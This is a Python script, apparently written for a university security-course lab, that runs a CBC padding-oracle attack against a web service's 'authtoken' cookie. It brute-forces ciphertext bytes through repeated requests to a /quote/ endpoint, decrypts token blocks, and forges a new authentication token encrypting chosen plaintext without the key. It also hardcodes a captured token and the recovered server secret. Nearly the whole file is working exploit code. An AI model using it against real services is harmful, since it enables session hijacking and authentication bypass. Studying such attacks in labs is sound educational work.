import requests
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import secrets

# URL of the target website
BASE_URL = "http://127.0.0.1:5000"
# BASE_URL = "https://cbc.syssec.dk"


# Get the authentication cookie
blocklength=16

response_messages = ["PKCS#7 padding is incorrect.", "Padding is incorrect." ]

class PaddingOracleException(Exception):
    """Custom exception raised when valid padding is not found."""
    pass

def xor_bytes(a: bytes, b: bytes) -> bytes:
    """XOR two byte sequences of the same length."""
    return bytes(x ^ y for x, y in zip(a, b))


def replace_byte(byteString: bytes, idx: int, newNumber:int ) -> bytes :
    """
    """
    myByteArray = bytearray(byteString)
    myByteArray[idx] = newNumber
    new_bytes = bytes(myByteArray)
    return new_bytes

def make_request(url, cookie) -> requests.Response:
    response = requests.get(url=url, cookies=cookie)      
    return response

def find_nth_byte_of_modified_CT(byte_index_to_replace:int ,  attack_ct:bytes, wrong_i:int) -> int:       
    """    
    find nth byte of modified CT such that N+16 th byte of PT would be 0
    byte_index_to_replace :_int_ in {0, __ }byte index of the attacker controlled ciphertext to replace(or bruteforce)
    attack_ct

    """
    for i in range(0,256):        
        attack_ct = replace_byte(attack_ct, byte_index_to_replace, i ) #replace the n_th byte
        
        
        response = make_request(f"{BASE_URL}/quote/", {'authtoken': attack_ct.hex()})
        #print(response.text)
        if response.text not in response_messages:
            #handle_edge case if it's the last byte
            #change attackCT's byte_index_to_replace_1 and query again, if that passes, good else keep trying
            attack_ct = replace_byte(attack_ct, byte_index_to_replace-1, 254)
            response2 = make_request(f"{BASE_URL}/quote/", {'authtoken': attack_ct.hex()})

            if response2.text not in response_messages:
                # print(f"found_modified_ID: {attack_ct}")
                padding = "correct"
                
                # print(f"ATTACK_main: padding is valid at byte_number={byte_index_to_replace}, i={i}, byte={i.to_bytes()}")
                # print(f"ATTACK_main: when attack CT byte number={byte_index_to_replace} is : i={i} OR byte={i.to_bytes()}, plaintext byte {byte_index_to_replace+ 16} is 0x__(ie valid padding)")
                # print(f"ATTACK_main: auth_token[bytes]: {original_token}, len:{len(original_token)}, blocks:{len(original_token)/16}")
                return i

    # If no valid padding was found, raise an exception
    raise PaddingOracleException(f"No valid padding found for byte index {byte_index_to_replace}")

def decrypt_one_block(n: int, decrypted_plaintext:bytes, ct_x:bytes, original_token:bytes, no_of_blocks, keystream):
    """
    n: block index whose key stream we are decrypting, attack byte(ct_x) will be in the previous block.
        example n = 3. We will be decrypting keystreams of c_48 to c_63. While out attacker controlled
        byte(which we bruteforce) will be in the previous block at c_32 to c47  


    decrypted_plaintext: _bytes_ length is the length of the ciphertext. The code marshalls the relevent
        bytes in the right place. We assume block P_0 will always be all xeroes since for 4 CT blocks(including IV) 
        there are 3 PT blocks

    ct_x: _bytes_ a ct_i is found when the corrosponding plaintext byte in the next block (and subsequent plaintext bytes)
        have valid padding. 
        example, we have 4 blocks C_0||C_1||C_2||C_3
        example1: ct_47_x (last attcker controlled byte of C_2) corrosponds to when P_63 is 0x01
        example2: ct_46_x (second last last attcker controlled byte of C_2) corrosponds to when P_62 and P_63 are both 0x02
        When this ct_x is found, it will be marshalled into the right place. Works on the larger encrpted ct and not just the 
        block ct. But only the block we are looking into gets touched, rest remains untouched.
        length = len(original_ciphertext)

    original_token: lenght should be from byte 0 to last byte of the block we want to decrypt.
                    example, there are 4 CT blocks: B_0, B_1, B_2, B_3
                    we are decryption B_2, then original token = B_0||B_1||B_2

    no_of_blocks: not used currently

    keystream: _bytes_  (hacky fix added later for encyrption oracle)
      gived the keystream of the block (index) we are decrypting
      length should be blocklength.


    """
    # n=no_of_blocks-1
    for i in range(1, 17):
        idx = (blocklength * n) -i # 46 #the cT byte index that we will modify
        print(f"i:{i}, idx:{idx}================================================\n")
        
        attack_ct = original_token[:]

        #replace previous(bits ahead) bits(if applicable) with the zeroing ct ^ i
        for j in range(1, i):
            idx_j = (blocklength*n)-j #47
            c_j_x = ct_x[idx_j] #extract the found ct byte that results in valid padding at byte+16
            attack_ct = replace_byte(attack_ct, idx_j, c_j_x ^ j^ i) 

        # print(f"main: attack ct: {attack_ct}")
        
        # Find the current byte that produces valid padding
        try:
            c_46_x = find_nth_byte_of_modified_CT(idx, attack_ct, 0)
        except Exception as e:
            print(e)
        # print(c_46_x)

        # Update ct_x for bookkeeping
        ct_x = replace_byte(ct_x, idx, c_46_x) #bookkeeping

        # Compute y_62 (the keystream byte with ct_x, not C_x)
        y_62 = c_46_x ^ i 
        
        
        p_62 = original_token[idx] ^ y_62
        # print(p_62.to_bytes())

        # Update decrypted plaintext with the found byte
        decrypted_plaintext = replace_byte(decrypted_plaintext, idx+16, p_62) #bookkeeping
        print(f"FUNC_decrypt_one_block: decreypted plaintext : {decrypted_plaintext}")

        y_62_actual = p_62 ^ original_token[idx]
        keystream = replace_byte(keystream, blocklength-i , y_62_actual)
        print(f"FUNC_decrypt_one_block: y_62_actual = {y_62_actual} = {p_62} xor {original_token[idx]}")
        print(f"FUNC_decrypt_one_block: y_62 = {y_62} = {c_46_x} xor {i}- sanity check")

        

    return decrypted_plaintext, ct_x, keystream

#=============================================

def get_auth_cookie():
    response = requests.get(f"{BASE_URL}/")
    if 'authtoken' in response.cookies:
        return response.cookies['authtoken']
    else:
        print("Failed to get auth token!")
        sys.exit(1)


# Padding oracle attack to decrypt the token


# Forge a valid authentication token
# def forge_token(secret):
#     # Implement CBC encryption using the oracle to generate a valid token
#     pass  # Replace this with your attack logic


def padding_oracle_attack(original_token, no_of_blocks):
        decrypted_plaintext = bytes(len(original_token))
        ct_x = bytes(len(original_token))
        key_stream = bytes(blocklength)

        for i in range(0, no_of_blocks):    
            decrypted_plaintext, ct_x, key_stream = decrypt_one_block(no_of_blocks-i-1, decrypted_plaintext, ct_x, original_token[0:(no_of_blocks-i) * blocklength], no_of_blocks, key_stream)
    
        return decrypted_plaintext, ct_x

def main():
    # Step 1: Get the authentication cookie
    
    auth_token = "28e597392e7d4c765ec436d2a6dcc6feee2caa69120dd9824e091f70f3c76619cc4fe84c4a2756d619ed117a8319719487174dd61ee3eb90fe1e163d5e12521b"
    # auth_token = "54bf84d811aa49905226a3fa5819ea709748e5b3b5956d0988a438e65d1b57648be52bce3c499cb81dd9310d583a4823cb698d90a6a5771977b4de889622373bab567135328753cee3f02f050886875f8e79d1f37b34e338f005c4334d895fd2"
    print(f"ATTACK: auth_token[hex]: {auth_token}, len:{len(auth_token)}, blocks:{len(auth_token)/32}\n")
    
    
    #  Convert hex to bytes
    original_token = bytes.fromhex(auth_token)
    
    print(f"MAIN: original token :{original_token}\n")
    # print(f"ATTACK: auth_token[bytes]: {original_token}, len:{len(original_token)}, blocks:{len(original_token)/16}\n")
    no_of_blocks = int(len(original_token)/16)
   
  
    #======================================
    #the actual attack to get the secret
    # decrypted_plaintext, ct_x = padding_oracle_attack(original_token, no_of_blocks)
    #=========================================

    #======================================================
    # for encryption of the now known secret without the key

    plaintext = b"<redacted> plain CBC is not secure!"
    plaintext = pad(plaintext, blocklength)
    print(f"MAIN: attack plaintext length after padding = {len(plaintext)}")
    forged_ct_length = len(plaintext) + blocklength
    print(f"MAIN: forged_ct_length = {forged_ct_length}")  #when this is 64 CT = IV || CT_0 || CT_1|| CT_2(random) ie 4 blocks
    no_of_blocks = int(forged_ct_length/blocklength)
    print(f"MAIN: no of blocks in forged CT = {no_of_blocks}")
    # initialising
    decrypted_plaintext = bytes(forged_ct_length)
    forged_token = bytearray(forged_ct_length)
    ct_x = bytes(forged_ct_length)
    key_stream = bytes(blocklength)

    #sample random last CT (C_2)
    c_2 = secrets.token_bytes(blocklength)
    
    #replace block
    # forged_token = bytearray(forged_token)
    forged_token[blocklength*3: (blocklength*4) ] = c_2
    # forged_token = bytes(forged_token)    
    print(f"MAIN: forged token : {forged_token}\n")
    print(f"MAIN: forged token _ length: {len(forged_token)}")
    

    decrypted_plaintext, ct_x, key_stream = decrypt_one_block(3, decrypted_plaintext, ct_x, bytes(forged_token[0: blocklength*4]), 0, key_stream)
    d_PO_c_2 = key_stream
    print(f"MAIN: D_po_c2 = {d_PO_c_2}, len : {len(d_PO_c_2)}")

    p_2 = plaintext[blocklength*2: (blocklength*3 )]
    print(f"MAIN: plaintext block index 2: {p_2}, len: {len(p_2)} ")
    c_1 = xor_bytes(p_2 ,d_PO_c_2)
    
    # #replace block and continue for c_1
   
    forged_token[blocklength*2: blocklength*3 ] = c_1
     
    print(f"MAIN: forged token : {forged_token} \n")
    print(f"MAIN: forged token  length: {len(forged_token)}")

    decrypted_plaintext, ct_x, key_stream = decrypt_one_block(2, decrypted_plaintext, ct_x, bytes(forged_token[0: blocklength*3]), 0, key_stream)
    d_PO_c_1 = key_stream
    print(f"MAIN: D_po_c1 = {d_PO_c_1}, len : {len(d_PO_c_1)}")

    p_1 = plaintext[blocklength*1: (blocklength*2 )]
    print(f"MAIN: plaintext block index 2: {p_1}, len: {len(p_1)} ")
    c_0 = xor_bytes(p_1 ,d_PO_c_1)

    # #replace block and continue for c_0
   
    forged_token[blocklength*1: blocklength*2 ] = c_0
     
    print(f"MAIN: forged token : {forged_token} \n")
    print(f"MAIN: forged token  length: {len(forged_token)}")

    decrypted_plaintext, ct_x, key_stream = decrypt_one_block(1, decrypted_plaintext, ct_x, bytes(forged_token[0: blocklength*2]), 0, key_stream)
    d_PO_c_0 = key_stream
    print(f"MAIN: D_po_c0 = {d_PO_c_0}, len : {len(d_PO_c_0)}")

    p_0 = plaintext[blocklength*0: (blocklength*1 )]
    print(f"MAIN: plaintext block index 2: {p_0}, len: {len(p_0)} ")
    IV = xor_bytes(p_0 ,d_PO_c_0)

    #--
    forged_token[blocklength*0: blocklength*1 ] = IV

    print(f"MAIN: forged token : {forged_token} \n")
    print(f"MAIN: forged token  length: {len(forged_token)}")  
    

    # make request with forged token

  

    

    
    # decrypted_plaintext, ct_x, key_stream = decrypt_one_block(no_of_blocks-i-1, decrypted_plaintext, ct_x, original_token[0:(no_of_blocks-i) * blocklength], no_of_blocks, key_stream)
    # print(keystream)


    

    # candidate_key_local = b"BBB<redacted>BBB"

    secret_server = b"I must use authenticated encryption since ..." #we found
    secret_server+= b" plain CBC is not secure!" # we found

    candidate_key_server = "I must use authenticated encryption since ..."

    
    # generate a random IV
  

    
    # attack the quote page to get quote
        



    
if __name__ == "__main__":
    main()
